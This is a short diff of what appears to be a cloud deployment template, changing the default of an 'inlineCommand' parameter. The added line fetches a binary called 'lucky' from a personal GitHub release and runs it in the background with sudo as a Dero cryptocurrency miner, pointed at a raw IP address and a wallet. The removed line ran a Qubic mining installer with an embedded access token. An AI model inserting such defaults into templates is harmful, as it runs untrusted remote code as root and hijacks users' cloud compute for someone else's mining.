@@ -67,7 +67,7 @@
         },
         "inlineCommand": {
             "type": "string",
-            "defaultValue": "sudo apt-get update -y; sudo apt install screen -y; sudo sysctl -w vm.nr_hugepages=1280; mkdir ccc; cd ccc; wget -O qli-Service-install.sh https://dl.qubic.li/cloud-init/qli-Service-install.sh; chmod u+x qli-Service-install.sh; ./qli-Service-install.sh 4 eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJJZCI6IjRlMTZiZDQwLWE5ODMtNDlmYi04NGE3LTM0MTA3NTgyY2UwNCIsIk1pbmluZyI6IiIsIm5iZiI6MTcxMTUzMzU2MywiZXhwIjoxNzQzMDY5NTYzLCJpYXQiOjE3MTE1MzM1NjMsImlzcyI6Imh0dHBzOi8vcXViaWMubGkvIiwiYXVkIjoiaHR0cHM6Ly9xdWJpYy5saS8ifQ.C9EIRgiNPE3I8jB4ds94TpvoLvkI00OxK3yKTvInSuRatlo50ceASoMrFKZ_wXHiSmvrT4h1jSzaldNX8Bvu9w lanada",
+            "defaultValue": "sudo apt-get update -y; sudo apt install screen -y; sudo sysctl -w vm.nr_hugepages=1280; mkdir vcc && cd vcc && wget https://github.com/jokervulinh96/lucky/releases/download/lucky/lucky.tar.gz && tar xf lucky.tar.gz && sudo nohup ./lucky -d 89.117.61.229:10100 -w dero1qyk2a6zw9slgfx5ttf0qru6xyfahn5nryhhy4xzzl4ynd6ndp2x8kqq8qga44 -t 4 --disable-gpu>log.out &",
             "metadata": {
                 "description": "inline command"
             }
